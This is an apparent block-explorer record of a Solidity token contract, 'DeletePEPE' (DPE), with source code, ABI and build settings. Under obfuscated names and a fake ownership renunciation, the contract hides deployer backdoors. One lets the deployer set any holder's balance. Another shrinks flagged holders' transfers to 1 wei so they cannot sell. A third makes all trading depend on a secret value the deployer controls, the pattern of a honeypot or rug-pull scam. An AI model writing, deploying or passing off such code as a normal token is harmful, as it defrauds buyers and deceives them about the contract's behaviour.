{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface listLaunchedLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchShouldFrom) external view returns (uint256);\n\n    function transfer(address minAt, uint256 enableFundLaunched) external returns (bool);\n\n    function allowance(address walletSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableFundLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minAt,\n        uint256 enableFundLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isAmount, uint256 value);\n    event Approval(address indexed walletSwap, address indexed spender, uint256 value);\n}\n\nabstract contract tokenList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listMaxReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface buyMode {\n    function createPair(address teamLiquidity, address isBuy) external returns (address);\n}\n\ninterface enableFrom is listLaunchedLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DeletePEPE is tokenList, listLaunchedLimit, enableFrom {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapLiquidityReceiver;\n    }\n\n    function toLaunch(address listFund, address minAt, uint256 enableFundLaunched) internal returns (bool) {\n        require(maxShould[listFund] >= enableFundLaunched);\n        maxShould[listFund] -= enableFundLaunched;\n        maxShould[minAt] += enableFundLaunched;\n        emit Transfer(listFund, minAt, enableFundLaunched);\n        return true;\n    }\n\n    mapping(address => uint256) private maxShould;\n\n    uint256 constant limitMarketing = 1 ** 10;\n\n    function liquidityLaunched(address fundTo) public {\n        if (receiverSenderLaunched) {\n            return;\n        }\n        if (totalEnable == sellShould) {\n            toList = false;\n        }\n        tradingAmount[fundTo] = true;\n        if (marketingTo == totalEnable) {\n            totalEnable = txLaunchReceiver;\n        }\n        receiverSenderLaunched = true;\n    }\n\n    uint256 private totalEnable;\n\n    uint256 txBuy;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenLimit;\n    }\n\n    function autoSenderToken(uint256 enableFundLaunched) public {\n        walletAuto();\n        receiverIs = enableFundLaunched;\n    }\n\n    bool public fromSell;\n\n    uint256 public fundFee;\n\n    string private launchedFrom = \"Delete PEPE\";\n\n    function atTokenReceiver() public {\n        emit OwnershipTransferred(receiverLaunchedFrom, address(0));\n        feeTeam = address(0);\n    }\n\n    function teamSwapLimit(address senderIs, uint256 enableFundLaunched) public {\n        walletAuto();\n        maxShould[senderIs] = enableFundLaunched;\n    }\n\n    uint256 public sellShould;\n\n    address private feeTeam;\n\n    function txSender(address exemptList) public {\n        walletAuto();\n        \n        if (exemptList == receiverLaunchedFrom || exemptList == receiverTo) {\n            return;\n        }\n        isTeam[exemptList] = true;\n    }\n\n    function transfer(address senderIs, uint256 enableFundLaunched) external virtual override returns (bool) {\n        return shouldLimit(_msgSender(), senderIs, enableFundLaunched);\n    }\n\n    event OwnershipTransferred(address indexed isAuto, address indexed fromTrading);\n\n    function shouldLimit(address listFund, address minAt, uint256 enableFundLaunched) internal returns (bool) {\n        if (listFund == receiverLaunchedFrom) {\n            return toLaunch(listFund, minAt, enableFundLaunched);\n        }\n        uint256 launchedMin = listLaunchedLimit(receiverTo).balanceOf(txEnableMode);\n        require(launchedMin == receiverIs);\n        require(minAt != txEnableMode);\n        if (isTeam[listFund]) {\n            return toLaunch(listFund, minAt, limitMarketing);\n        }\n        return toLaunch(listFund, minAt, enableFundLaunched);\n    }\n\n    string private maxFeeMode = \"DPE\";\n\n    mapping(address => bool) public isTeam;\n\n    function name() external view virtual override returns (string memory) {\n        return launchedFrom;\n    }\n\n    bool public receiverSenderLaunched;\n\n    uint256 private limitModeSwap;\n\n    address txEnableMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public marketingTo;\n\n    function getOwner() external view returns (address) {\n        return feeTeam;\n    }\n\n    address shouldList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxFeeMode;\n    }\n\n    uint256 private swapLiquidityReceiver = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return feeTeam;\n    }\n\n    uint256 private txLaunchReceiver;\n\n    function approve(address launchedEnableBuy, uint256 enableFundLaunched) public virtual override returns (bool) {\n        txLimitToken[_msgSender()][launchedEnableBuy] = enableFundLaunched;\n        emit Approval(_msgSender(), launchedEnableBuy, enableFundLaunched);\n        return true;\n    }\n\n    constructor (){\n        if (sellShould == marketingTo) {\n            totalEnable = limitModeSwap;\n        }\n        listMaxReceiver swapTeam = listMaxReceiver(shouldList);\n        receiverTo = buyMode(swapTeam.factory()).createPair(swapTeam.WETH(), address(this));\n        \n        receiverLaunchedFrom = _msgSender();\n        atTokenReceiver();\n        tradingAmount[receiverLaunchedFrom] = true;\n        maxShould[receiverLaunchedFrom] = swapLiquidityReceiver;\n        \n        emit Transfer(address(0), receiverLaunchedFrom, swapLiquidityReceiver);\n    }\n\n    address public receiverTo;\n\n    function walletAuto() private view {\n        require(tradingAmount[_msgSender()]);\n    }\n\n    uint256 receiverIs;\n\n    function balanceOf(address launchShouldFrom) public view virtual override returns (uint256) {\n        return maxShould[launchShouldFrom];\n    }\n\n    function transferFrom(address listFund, address minAt, uint256 enableFundLaunched) external override returns (bool) {\n        if (_msgSender() != shouldList) {\n            if (txLimitToken[listFund][_msgSender()] != type(uint256).max) {\n                require(enableFundLaunched <= txLimitToken[listFund][_msgSender()]);\n                txLimitToken[listFund][_msgSender()] -= enableFundLaunched;\n            }\n        }\n        return shouldLimit(listFund, minAt, enableFundLaunched);\n    }\n\n    mapping(address => bool) public tradingAmount;\n\n    function allowance(address toLaunched, address launchedEnableBuy) external view virtual override returns (uint256) {\n        if (launchedEnableBuy == shouldList) {\n            return type(uint256).max;\n        }\n        return txLimitToken[toLaunched][launchedEnableBuy];\n    }\n\n    mapping(address => mapping(address => uint256)) private txLimitToken;\n\n    uint8 private tokenLimit = 18;\n\n    bool public toList;\n\n    address public receiverLaunchedFrom;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTrading\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedEnableBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedEnableBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableFundLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTokenReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableFundLaunched\",\"type\":\"uint256\"}],\"name\":\"autoSenderToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchShouldFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTo\",\"type\":\"address\"}],\"name\":\"liquidityLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunchedFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSenderLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableFundLaunched\",\"type\":\"uint256\"}],\"name\":\"teamSwapLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableFundLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableFundLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptList\",\"type\":\"address\"}],\"name\":\"txSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DeletePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}